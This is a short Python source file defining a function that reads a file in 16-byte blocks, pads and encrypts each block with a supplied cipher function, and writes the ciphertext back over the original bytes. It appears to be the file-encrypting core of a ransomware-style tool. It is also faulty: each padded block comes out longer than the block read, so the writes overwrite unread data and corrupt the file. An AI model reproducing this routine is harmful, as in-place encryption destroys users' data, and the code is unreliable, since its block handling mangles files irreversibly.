import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding


def change_files(filename, cryptFn):
    block_size = 16
    with open(filename, 'r+b') as _file:
        raw_value = _file.read(block_size)
        while raw_value:
            padder = padding.PKCS7(block_size * 8).padder()
            padded_data = padder.update(raw_value) + padder.finalize()
            cipher_value = cryptFn(padded_data)

            _file.seek(-len(raw_value), 1)
            _file.write(cipher_value)
            raw_value = _file.read(block_size)